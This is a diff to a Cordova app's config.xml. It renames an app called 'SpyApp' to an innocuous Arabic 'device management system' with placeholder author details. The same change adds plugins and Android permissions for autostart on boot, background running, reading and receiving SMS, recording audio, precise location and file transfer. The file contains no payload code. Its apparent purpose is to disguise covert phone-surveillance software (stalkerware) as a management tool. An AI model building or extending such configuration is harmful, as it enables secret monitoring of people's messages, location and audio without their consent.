@@ -1,6 +1,8 @@
 <?xml version='1.0' encoding='utf-8'?>
-<widget id="com.spyapp.spy" version="1.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
-    <name>SpyApp</name>
+<widget id="com.example.devicecontrol" version="1.0.0" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
+    <name>نظام إدارة الأجهزة</name>
+    <description>تطبيق لإدارة الأجهزة عن بعد</description>
+    <author email="support@example.com" href="http://example.com">فريق التطوير</author>
     <content src="index.html" />
     <access origin="*" />
     <allow-intent href="http://*/*" />
@@ -9,58 +11,41 @@
     <allow-intent href="sms:*" />
     <allow-intent href="mailto:*" />
     <allow-intent href="geo:*" />
-
-    <!-- ✅ استهداف آخر SDK -->
-    <preference name="android-targetSdkVersion" value="34" />
-
-    <!-- ✅ الإضافات (Plugins) -->
-    <plugin name="cordova-plugin-camera" />
-    <plugin name="cordova-plugin-media-capture" />
-    <plugin name="cordova-plugin-contacts" />
-    <plugin name="cordova-plugin-file" />
-    <plugin name="cordova-plugin-file-transfer" />
-    <plugin name="cordova-plugin-geolocation" />
-    <plugin name="cordova-plugin-android-permissions" />
-    <plugin name="cordova-plugin-media" />
-    <plugin name="cordova-plugin-background-mode" />
-    <plugin name="cordova-plugin-dialogs" />
-
-    <!-- ✅ التفضيلات (Preferences) -->
-    <preference name="KeepRunning" value="true" />
-    <preference name="BackgroundMode" value="audio" />
-
+    
     <platform name="android">
-        <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
-            <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-                      xmlns:tools="http://schemas.android.com/tools">
-
-                <!-- 🗂️ التخزين -->
-                <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-                <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
-                                 android:maxSdkVersion="29" />
-
-                <!-- 🎤 الكاميرا والصوت -->
-                <uses-permission android:name="android.permission.CAMERA" />
-                <uses-permission android:name="android.permission.RECORD_AUDIO" />
-
-                <!-- 📍 الموقع -->
-                <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-
-                <!-- 🌐 الشبكة -->
-                <uses-permission android:name="android.permission.INTERNET" />
-
-                <!-- 🔔 الإشعارات (Android 13+) -->
-                <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-
-                <!-- ⚡ تشغيل بالخلفية -->
-                <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-                <uses-permission android:name="android.permission.WAKE_LOCK" />
-                <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
-
-                <!-- ⚠️ اختيارية (مرفوضة في Google Play غالباً) -->
-                <!-- <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" /> -->
-
-            </manifest>
-        </edit-config>
+        <allow-intent href="market:*" />
+        <preference name="android-minSdkVersion" value="22" />
+        <preference name="android-targetSdkVersion" value="33" />
+        <preference name="KeepRunning" value="true" />
+        <preference name="loadUrlTimeoutValue" value="60000" />
     </platform>
+    
+    <platform name="ios">
+        <allow-intent href="itms:*" />
+        <allow-intent href="itms-apps:*" />
+    </platform>
+    
+    <plugin name="cordova-plugin-background-mode" spec="^0.7.3" />
+    <plugin name="cordova-plugin-android-permissions" spec="^1.1.2" />
+    <plugin name="cordova-plugin-autostart" spec="^2.3.0" />
+    <plugin name="cordova-plugin-sms" spec="^1.0.5" />
+    <plugin name="cordova-plugin-media-capture" spec="^3.0.3" />
+    <plugin name="cordova-plugin-file" spec="^6.0.2" />
+    <plugin name="cordova-plugin-file-transfer" spec="^1.7.1" />
+    <plugin name="cordova-plugin-device" spec="^2.1.0" />
+    <plugin name="cordova-plugin-geolocation" spec="^4.1.0" />
+    <plugin name="cordova-plugin-dialogs" spec="^2.0.2" />
+    
+    <config-file parent="/*" target="AndroidManifest.xml">
+        <uses-permission android:name="android.permission.RECORD_AUDIO" />
+        <uses-permission android:name="android.permission.READ_SMS" />
+        <uses-permission android:name="android.permission.RECEIVE_SMS" />
+        <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+        <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+        <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+        <uses-permission android:name="android.permission.WAKE_LOCK" />
+        <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+        <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+        <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    </config-file>
 </widget>
